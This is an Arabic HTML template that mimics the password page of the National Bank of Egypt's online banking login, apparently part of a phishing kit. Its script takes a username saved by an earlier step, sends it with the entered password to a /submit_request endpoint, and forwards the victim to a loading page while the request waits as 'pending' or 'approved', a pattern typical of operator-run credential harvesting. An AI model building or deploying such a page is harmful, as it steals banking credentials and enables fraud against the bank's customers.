<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>البنك الأهلي المصري - كلمة المرور</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='login-theme.css') }}">
</head>
<body>

<header class="site-header">
    <div class="header-right">
        <img src="{{ url_for('static', filename='static_nbe_logo_full.png') }}" alt="البنك الأهلي المصري">
    </div>
    <div class="header-left">
        <a href="password_en.html" class="lang-switcher">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.3 2.5 3.5 5.5 3.5 9s-1.2 6.5-3.5 9c-2.3-2.5-3.5-6.5-3.5-9S9.7 5.5 12 3z"></path></svg>
            <span>English</span>
        </a>
        <a href="login.html" style="color: #888; margin-right: 10px; font-size: 20px;"><i class="fas fa-chevron-left"></i></a>
    </div>
</header>

<main class="login-shell">
    <div class="login-card-container">
        <div class="card-logo">
            <img src="{{ url_for('static', filename='static_nbe_logo_full.png') }}" alt="البنك الأهلي المصري">
        </div>

        <div class="stamp-container">
            <img src="{{ url_for('static', filename='stamp.jpg') }}" alt="Security Stamp">
        </div>
        <div class="stamp-label">agile trees</div>

        <section class="login-card">
            <div id="errorMessage" role="alert" style="display:none; color: red; margin-bottom: 10px;"></div>
            <form id="step2Form">
                <div class="form-group pass-wrapper">
                    <input type="password" id="password" name="password" class="form-control" placeholder="كلمة المرور" required autofocus>
                    <i class="far fa-eye pass-toggle" id="togglePass"></i>
                </div>
                <a href="#" class="forgot-link">نسيت كلمة المرور</a>
                
                <div class="submit-actions">
                    <button type="submit" class="submit-btn" id="submitBtn">تسجيل الدخول</button>
                    <button type="button" class="biometric-btn">
                        <i class="fas fa-fingerprint"></i>
                    </button>
                </div>
            </form>
        </section>
    </div>
</main>

<script>
// تبديل رؤية كلمة المرور
document.getElementById('togglePass').addEventListener('click', function() {
    const passInput = document.getElementById('password');
    if (passInput.type === 'password') {
        passInput.type = 'text';
        this.classList.replace('fa-eye', 'fa-eye-slash');
    } else {
        passInput.type = 'password';
        this.classList.replace('fa-eye-slash', 'fa-eye');
    }
});

document.getElementById('step2Form').addEventListener('submit', async function(event) {
    event.preventDefault();
    const password = document.getElementById('password').value;
    const username = localStorage.getItem('temp_username');
    const btn = document.getElementById('submitBtn');
    const errorMessageDiv = document.getElementById('errorMessage');

    btn.disabled = true;
    btn.innerText = "جاري المعالجة...";

    try {
        const response = await fetch("/submit_request", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                type: 'password',
                data: { username: username, password: password }
            })
        });

        const result = await response.json();
        if (result.status === 'approved' || result.status === 'pending') {
            window.location.href = 'loading.html?request_id=' + result.request_id;
        } else {
            errorMessageDiv.textContent = result.message || 'خطأ في تسجيل الدخول';
            errorMessageDiv.style.display = 'block';
            btn.disabled = false;
            btn.innerText = "تسجيل الدخول";
        }
    } catch (error) {
        errorMessageDiv.textContent = 'حدث خطأ أثناء الاتصال بالخادم';
        errorMessageDiv.style.display = 'block';
        btn.disabled = false;
        btn.innerText = "تسجيل الدخول";
    }
});
</script>
</body>
</html>
